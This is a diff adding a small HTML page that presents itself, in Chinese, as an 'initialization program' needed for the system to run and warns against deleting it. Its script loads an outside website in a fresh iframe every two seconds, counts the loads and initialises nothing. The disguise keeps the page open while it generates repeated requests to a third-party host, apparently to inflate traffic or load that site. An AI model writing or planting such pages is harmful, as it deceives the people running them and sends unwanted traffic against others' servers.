@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>初始化程序</title>
+</head>
+<body style="font-family: 'Microsoft YaHei Ui';">
+  <iframe style="display:none" id="a"></iframe>
+  <div id="fdg" style="text-align: center; position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%);">
+    <h1 style="text-align: center;">此程序为系统运行的必要程序，请勿删除</h1>
+    <div id='bar'></div>
+    <div style='font-size: 1.5em;'>Initializing...</div>
+  </div>
+  <!--<div id="sdf">Soilwater</div>-->
+  <script>
+    let a = document.getElementById('a');
+    let disp = document.getElementById('sdf');
+    let i = 0;
+    setInterval(() => {
+      let frame = document.createElement("iframe");
+      //frame.style.display = "none";
+      frame.src = "https://www.hsltechnology.cn/?t=114"
+      frame.style.width = frame.style.height = "30px";
+      frame.style.filter = 'invert(1)';
+      frame.style.border = '1px solid white';
+      frame
+      document.getElementById('bar').append(frame);
+      frame.onload = () => {
+        i++;
+        frame.remove();
+        console.log(i);
+      }
+    }, 2000);</script>
+</body>
+</html>
